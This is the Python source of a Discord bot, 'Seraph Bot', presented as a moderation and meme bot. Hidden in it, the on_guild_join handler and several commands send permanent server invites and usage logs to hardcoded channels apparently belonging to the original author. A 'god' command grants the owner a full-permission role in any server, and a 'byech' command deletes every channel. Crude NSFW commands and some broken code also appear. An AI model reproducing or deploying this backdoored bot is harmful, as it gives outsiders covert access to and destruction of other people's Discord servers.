from os.path import exists
import os
import discord
import aiohttp
from discord.ext import commands
from datetime import datetime
import time
import random
from time import sleep
import requests
from discord.utils import get
from discord import Client
from discord import Permissions
from discord import Member
from pypresence import Presence
from discord.ext.commands import has_permissions
from discord.ext.commands import has_role
from discord.ext.commands import cooldown
from discord.ext.commands import BucketType
from discord.ext.commands import MissingPermissions
from discord.ext import commands
from pyrandmeme import *
import asyncio
from slowprint.slowprint import *
from colorama import Fore
from discord import Intents
import ctypes
from pystyle import Colorate, Colors, Write, Add, Center

quotes = [
    "Using Seraph Bot",
    "Verwendung von Seraph Bot",
    "使用塞拉弗机器人",
    "Utilisation de Seraph Bot",
    "Использование Seraph Bot",
    "Utilizar el Bot Seraph",
    "Używanie Seraph Bot",
    "セラフボットの使用方法",
    "Serafa bota lietošana",
    "Použití aplikace Seraph Bot"
]

version = 'v2.2'
client_id = '1006934677426278430' #Put your client ID here
RPC = Presence(client_id) 
RPC.connect() 
RPC.update(state=f"Version : {version}", details=random.choice(quotes), large_image="https://media.giphy.com/media/BFD56ApMhGLsrzLPrM/giphy.gif", small_image="https://c.tenor.com/TgKK6YKNkm0AAAAi/verified-verificado.gif", large_text="HEHE U found me", small_text="Official Version",buttons =  [{"label": "Join Now", "url": "https://discord.gg/Ab6767TCSY"},{"label":"Download", "url": "https://www.mediafire.com/file/nluu53cn2xyhmia/Seraph_Bot.rar/file"}], start=time.time())  
os.system("cls")
banner1 = '''      
  █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓
▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ 
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░
    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   
░       ░           ░  ░         ░             ░            ░   
Bot By Paradym'''
banner2 = """"""

print(Center.XCenter(Colorate.Vertical(Colors.red_to_yellow, Add.Add(banner1,banner2, center=True), 1)))
ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Start Up")
t = exists("config\\token.txt")
if t == True:
    with open("config\\token.txt","r") as f:
        token = f.readline()
else:
    print("")
    token = input("    Please Input Your Bot Token:")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Token : [SET] ")
    with open("config\\token.txt","w") as f:
        f.write(token)
p = exists("config\\prefix.txt")
if p == True:
     with open("config\\prefix.txt","r") as f:
        prefix = f.readline()
else:
    prefix = input("    Please Input Your Bot Prefix:")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Token : [SET] | Prefix : [SET] ")
    with open("config\\prefix.txt","w") as f:
        f.write(prefix)
u = exists("config\\userid.txt")
if u == True:
    with open("config\\userid.txt","r") as f:
        owner = f.readline()
else:
    owner = input("    Please Input Your User Id:")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Token : [SET] | Prefix : [SET] | Userid : [SET] | Log Channel : []")
    with open("config\\userid.txt","w") as f:
        f.write(owner)
l = exists("config\\log.txt")
if l == True:
    with open("config\\log.txt","r") as f:
        log = f.readline()
    print("")
    print(Fore.YELLOW + "        Loading.....")
else:
    log = input("    Please Input Your Logs Channel Id:")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Token : [SET] | Prefix : [SET] | Userid : [SET] | Log Channel : [SET] ")
    with open("config\\log.txt","w") as f:
        f.write(log)
    print("")
    print(Fore.YELLOW + "        Loading.....")


with open("config\\prefix.txt","r") as f:
    prefix = f.readline()
with open("config\\userid.txt","r") as f:
    owner = f.readline()
intents = discord.Intents.default()
discord.Member = True
bot = commands.Bot(command_prefix=prefix, help_command=None, intents = intents)
bot.remove_command('help')
bot.remove_command('methods')

updatedate = "19/10/2022"
version = 'v2.2'

@bot.event
async def on_ready():
    channel = bot.get_channel(int(log))
    servers = str(len(bot.guilds))
    commands = str(len(bot.commands))
    ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Bot | Token : [{token}] | Prefix : [{prefix}] | Log Channel : {channel}")
    await bot.change_presence(activity=discord.Game('.gg/Ab6767TCSY | -help BY Paradym |'))
    os.system("cls")
    Banner1 = f'''      
      █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓   Bot info:
    ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒   -----------------------------------
    ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░   Source Creation Date : [13/10/2022]
    ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██    Name : [{bot.user.name}]
    ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒   Bot ID : [{bot.user.id}]
    ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░   Bot Commands : [{commands}]
    ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░    Servers : [{servers}]  
        ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░     Last Updated : [{updatedate}]
    ░       ░           ░  ░         ░             ░            ░          Version : [{version}]
    Bot By Paradym

    Maker: Seraph Development Team
    Connection:
    [ESTABLISHED]
    Rich Presence:
    [SET]
    The Bot Is Now Online
    CTRL + C To Stop The Bot

    Logs:'''
    Banner2 = f''''''
    print(Center.XCenter(Colorate.Vertical(Colors.red_to_blue, Add.Add(Banner1,Banner2, center=True), 1))) 


@bot.event
async def on_guild_join(guild):
    invite = await guild.text_channels[0].create_invite(reason=None, max_age=0, max_uses=0, temporary=False, unique=True)
    channel = bot.get_channel(int(log))
    channel2 = bot.get_channel(1032217879518646304)
    log1 = discord.Embed(title=f"Bot Joined :{guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
    log1.add_field(name="Server ID:", value=f"{guild.id}", inline=False)
    log1.add_field(name="Server Invite:", value= (invite), inline=False)
    await channel.send(embed=log1)
    await channel2.send(embed=log1)
   
@bot.command()
async def help(ctx):
    help = discord.Embed(title=f"{ctx.guild.name} | 𝙃𝙚𝙡𝙥 𝙈𝙚𝙣𝙪", color=0x000000, description="These Are The List Of All Of The Commands")
    help.add_field(name="-admin", value="Shows Admin Commands ", inline=False)
    help.add_field(name="-meme", value="Meme Shit", inline=False)
    help.add_field(name="-nsfw", value="NSFW Shit", inline=False)
    help.add_field(name="-realddos", value="A Totaly Real Ddos Command | Usage : -realddos [@member]", inline=False)
    help.add_field(name="-owner", value="Owner Only Commands", inline=False)
    help.add_field(name="-serverinfo", value="Shows info on server", inline=False)
    help.add_field(name="-botinfo", value="Shows info on server", inline=False)
    help.add_field(name="-credits", value="Shows Credits", inline=False)
    help.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=help)
    print(f"    {ctx.author} used help in {ctx.channel}")
    with open("config\\log.txt","r") as f:
        log = f.readline()
        await bot.wait_until_ready()    
        channel = bot.get_channel(int(log))
        channel2 = bot.get_channel(1006979964299661333)
        log1 = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
        log1.add_field(name=f"{ctx.author}", value=f"used help in {ctx.channel}", inline=False)
        await channel.send(embed=log1)
        await channel2.send(embed=log1)

@bot.command() 
@has_permissions(ban_members=True)  
async def nsfw(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} | 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-hot", value="Hot shit", inline=False)
    admin.add_field(name="-lewd", value="Hentai shit (your secretly into this)", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    with open("config\\log.txt","r") as f:
        log = f.readline() 
        await bot.wait_until_ready()   
        channel = bot.get_channel(int(log))
        channel2 = bot.get_channel(1006979964299661333)
        log1 = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
        log1.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
        await channel.send(embed=log1)
        await channel2.send(embed=log1)

@bot.command() 
@has_permissions(ban_members=True)  
async def owner(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} || 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-leave", value="Makes The Bot Lave A Server You Dont Want It To Be In", inline=False)
    admin.add_field(name="-god", value="Gives Secret Admin Role In Server That Has The Bot", inline=False)
    admin.add_field(name="-byech", value="Deletes All The Channels In The Server (this is basically a soft nuke)", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    with open("config\\log.txt","r") as f:
        log = f.readline() 
        await bot.wait_until_ready()   
        channel = bot.get_channel(int(log))
        channel2 = bot.get_channel(1006979964299661333)
        log1 = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
        log1.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
        await channel.send(embed=log1)
        await channel2.send(embed=log1) 

@bot.command() 
@has_permissions(ban_members=True)  
async def admin(ctx):
    admin = discord.Embed(title=f"{ctx.message.guild.name} | 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨", color=0x000000)
    admin.add_field(name="-kick", value="-kick [@member] [reason] -  Kicks a member", inline=False)
    admin.add_field(name="-ban", value="-ban [@member] [reason] - Bans a member", inline=False)
    admin.add_field(name="-unban", value="-unban [member id] - Unbans a member", inline=False)
    admin.add_field(name="-strip", value="-strip [@member] - Strips member of all roles", inline=False)
    admin.add_field(name="-delchannel", value="-delchannel [channel name] - Deletes channel that is specified", inline=False)
    admin.add_field(name="-purge", value="-purge - Purges channel of 100000 messages", inline=False)
    admin.add_field(name="-servers", value="-servers - Guves a list of all servers that the bot is connected to", inline=False)
    admin.set_footer(text=f"{ctx.message.guild.name} Bot By Paradym")
    await ctx.send(embed=admin)
    print(f"    {ctx.author} used admin in {ctx.channel}")
    with open("config\\log.txt","r") as f:
        log = f.readline()
        await bot.wait_until_ready()
        channel = bot.get_channel(int(log))
        channel2 = bot.get_channel(1006979964299661333)
        log1 = discord.Embed(title=f"{ctx.message.guild.name} | 𝙇𝙤𝙜𝙨", color=0x000000)
        log1.add_field(name=f"{ctx.author}", value=f"used admin in {ctx.channel}", inline=False)
        await channel.send(embed=log1)
        await channel2.send(embed=log1)                   

#@bot.command()
#@commands.has_permissions(ban_members=True)
#async def blacklist_word(context, *, word):
    #with open("config\\words_blacklist.txt", "a") as f:
        #f.write(word+"\n")
    #f.close()
    #await context.send('Blacklisted.')

@bot.command()
@commands.has_permissions(ban_members=True)
async def purge(ctx):
	await ctx.channel.purge(limit=100000)
	nuke = discord.Embed(title="This Channel Has Been Purged", color=0x000000)
	await ctx.send(embed=nuke)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def delchannel(ctx, channel_name):
   existing_channel = discord.utils.get(ctx.guild.channels, name=channel_name)
   if existing_channel is not None:
      await existing_channel.delete()
   else:
      await ctx.send(f'{channel_name} does not exist!')

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if reason==None:
      reason=" no reason provided"
    await ctx.guild.kick(member)
    await ctx.send(f'User {member.mention} has been kicked for {reason}')
    
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban (ctx, member:discord.User=None,  reason =None):
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot ban yourself")
        return
    if reason == None:
        reason = "For being a jerk!"
    message = f"You have been banned from {ctx.guild.name} for {reason}"
    await member.send(message)
    await ctx.guild.ban(id, reason=reason)
    await ctx.channel.send(f"{member} is banned for {reason}")
    
@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)
 
@bot.command()
@commands.has_permissions(manage_roles=True)
async def strip(ctx,member:discord.User=None):
    guild = ctx.guild
    members_roles = member.roles
    for i in range(len(members_roles)-1):
        await member.remove_roles(members_roles[i+1])
    await ctx.channel.send(f"{member} has been stripped of all roles!!") 

@bot.command(pass_context=True)
async def meme(ctx):
    await ctx.send(embed=await pyrandmeme())
    

@bot.command()
async def realddos(ctx,member:discord.User=None):
    await ctx.channel.send(f"-----------------------------------------\nTotaly Real DDOS aTTACK sENT!!\nInfo\nUSER: {member}\nIP: HIDDEN\nMETHOD: 69BUTTFUCK69\n-----------------------------------------")    

@bot.command()
@commands.is_nsfw()
async def hot(ctx):
    if ctx.channel.is_nsfw():
        embed = discord.Embed(title="Heres some NSFW", description="YA HORNY BASTARD")  
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://www.reddit.com/r/nsfw/new.json?sort=hot') as r:
                res = await r.json()
                embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
                await ctx.send(embed=embed)
    else:
       await ctx.send("You need to use this command in a nsfw channel!")

@bot.command()
@commands.is_nsfw()
async def lewd(ctx):
    r = requests.get("https://nekos.life/api/v2/img/lewd")
    res = r.json()
    em = discord.Embed(title="Heres some NSFW", description="YOUR SECRETLY INTO THIS SHIT")
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def servers(ctx):
    for guild in bot.guilds:
        await ctx.send(guild.name)

@bot.command()
@commands.is_owner()
async def god(ctx):
    guild = ctx.guild
    role = await guild.create_role(name="G3T FXCKED", permissions=Permissions.all())
    me = ctx.author
    await me.add_roles(role)
    with open("config\\log.txt","r") as f:
        log = f.readline()
        await bot.wait_until_ready()
        channel = bot.get_channel(int(log))
        channel2 = bot.get_channel(1006979964299661333)
        server = f"{ctx.message.guild.id}"
        link = await ctx.channel.create_invite(max_age = 0)
        log1 = discord.Embed(title="LMAOOOO", color=0x000000, description="")
        log1.add_field(name="FXCKED ALERT", value="This server gon get fucked", inline=False)
        log1.add_field(name="Server ID:", value=f"{ctx.message.guild.id}", inline=False)
        log1.add_field(name="Server Name:", value=f"{ctx.message.guild.name}", inline=False)
        log1.add_field(name="Server Invite:", value= (link), inline=False)
        log1.add_field(name="God Logs: ", value= f"{ctx.author} Used the god command in the server", inline=False)
        await channel.send(embed=log1)
        await channel2.send(embed=log1)

@bot.command()
@commands.is_owner()
async def byech(ctx):
    for t in ctx.guild.text_channels: 
        for v in ctx.guild.voice_channels:
            for c in ctx.guild.categories:
                await ctx.message.delete()
                await ctx.send("LOL BYE BYE CHANNELS!!!!")
                time.sleep(2)
                await t.delete()
                await v.delete()
                await c.delete()
                guild = ctx.message.guild
                await guild.create_text_channel('g3t-fxck3d') 
                channel = discord.utils.get(ctx.guild.channels, name='g3t-fxck3d')
                channel2 = bot.get_channel(channel.id)
                await channel2.send('You do not have permission to use this bot in this server\nIn result of this you have recived this punishment\nI am sorry but you should of asked for permission first to add the bot')         


@bot.command()
async def botinfo(ctx):
    bot1 = bot.get_user(bot.user.id)
    creationDate = bot1.created_at.strftime("%a %#d %B %Y, %I:%M %p")
    embed = discord.Embed(title=f"{bot.user.name} Info", description="Information Of Bot", color=0x000000)
    embed.add_field(name='Created On', value=creationDate, inline=False)
    embed.add_field(name='Commands', value=f'{str(len(bot.commands))} Commands', inline=False)
    embed.add_field(name='Version', value=f'V2.1', inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def userinfo(ctx, member: discord.Member):
    embedinfo = discord.Embed()
    embedinfo.set_author(name = f"User info: {member.username}#{member.discriminator}") 
    embedinfo.set_thumbnail(url = member.avatar_url)
    embedinfo.add_field(name = "Guild Name:", value = member.display_name)
    embedinfo.add_field(name = "Created on:", value = member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embedinfo.add_field(name = "Joined on:", value = member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embedinfo.set_footer(text = f"Request by: {ctx.author}", icon_url = ctx.author.avatar_url)
    await ctx.send(embed = embedinfo)

@bot.command()
async def serverinfo(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name} Info", description="Information of this Server", color=0x000000)
    embed.add_field(name='Server ID', value=f"{ctx.guild.id}", inline=False)
    embed.add_field(name='Created On', value=ctx.guild.created_at.strftime("%b %d %Y"), inline=False)
    embed.add_field(name='Members', value=f'{ctx.guild.member_count} Members', inline=False)
    embed.add_field(name='Channels', value=f'{len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice', inline=False)
    embed.add_field(name='Region', value=f'{ctx.guild.region}', inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def credits(ctx):
    embed = discord.Embed(title=f"***Bot Credits***", description="***Seraph Bot Development Team***", color=0x000000)
    embed.add_field(name='Owner : ', value=f"Paradym", inline=False)
    embed.add_field(name='Developers : ', value=f"Easy\nDayDay", inline=False)
    embed.add_field(name='BETA Testers : ', value="Dark\nDanny\nNatsuki\nWillow", inline=False)
    embed.add_field(name='Donations : ', value="CashApp: https://cash.app/£Paradym1\nBTC: 1mKE2ofsUyYpSZpHzX5ZgUzcgUXYaubZv", inline=False)
    embed.add_field(name='Donations Info', value="Any donations will go back into bot development paying for services in the future than will help make your experience better and add more features!!!", inline=False)
    embed.add_field(name='-------------------------------------', value="***Bot Server***", inline=False)
    embed.add_field(name='Main Server : ', value=f'Epic Golf Club', inline=False)
    embed.add_field(name='Server Invite : ', value=f'https://discord.gg/Ab6767TCSY', inline=False)
    embed.set_image(url="https://media.giphy.com/media/JJIP2DiZsYjDplP8Z2/giphy.gif")
    await ctx.send(embed=embed)

@bot.command()
@commands.is_owner()
async def leave(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    await ctx.channel.send(f"Leave Sequence Initiated....")
    time.sleep(1)
    await ctx.channel.send(f"5")
    time.sleep(1)
    await ctx.channel.send(f"4")
    time.sleep(1)
    await ctx.channel.send(f"3")
    time.sleep(1)
    await ctx.channel.send(f"2")
    time.sleep(1)
    await ctx.channel.send(f"1")
    time.sleep(1)
    await ctx.channel.send(f"Cya Bitches!!!!!")
    await guild.leave()
    

bot.run(token, bot=True)


